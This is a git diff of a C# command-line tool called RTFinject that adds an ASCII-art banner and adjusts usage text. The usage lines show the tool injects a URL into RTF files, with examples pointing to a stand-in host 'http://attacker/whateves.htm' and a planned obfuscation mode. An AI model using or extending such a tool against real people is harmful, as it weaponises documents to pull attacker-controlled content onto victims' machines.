@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -13,10 +13,32 @@ namespace RTFinject
         static void Main(string[] args)
         {
 
+            Console.WriteLine(@"
+         @@@@@@@@@@@@@@@@@@@@@@@@@/                
+       @@                       @@@@              
+       @@                       @@@@@@            
+       @@                       @@@@@@@@          
+       @@                       @@@@@@@@@@        
+       @@                       @@@@@@@@@@@@      
+       @@                                *@@      
+       @@                                *@@      
+   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  
+   @@@@@@@@        *@@          @@       @@@@@@@  
+   @@@@@@@@   @@@@  @@@@@   @@@@@@  @@@@@@@@@@@@  
+   @@@@@@@@        @@@@@@   @@@@@@       @@@@@@@  
+   @@@@@@@@   @@@   @@@@@   @@@@@@  @@@@@@@@@@@@  
+   @@@@@@@@   @@@   @@@@@   @@@@@@  @@@@@@@@@@@@  
+   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  
+    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   
+       @@                                *@@      
+       @@                                *@@      
+       @@                                *@@      
+       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                ");
+
             if (args == null | args.Length == 0)
             {
                 Console.WriteLine("\nUSAGE: .\\RTFInject.exe file.rtf {URL}");
-                Console.WriteLine("COMING SOON... USAGE: .\\RTFInject.exe obfuscate file.rtf {URL}\n");
+                Console.WriteLine("COMING SOON... USAGE: .\\RTFInject.exe obfuscate file.rtf {URL}");
                 Console.WriteLine("EXAMPLE: .\\RTFInject.exe file.rtf http://attacker/whateves.htm");
                 Console.WriteLine("EXAMPLE: .\\RTFInject.exe obfuscate file.rtf http://attacker/whateves.htm\n");
             }
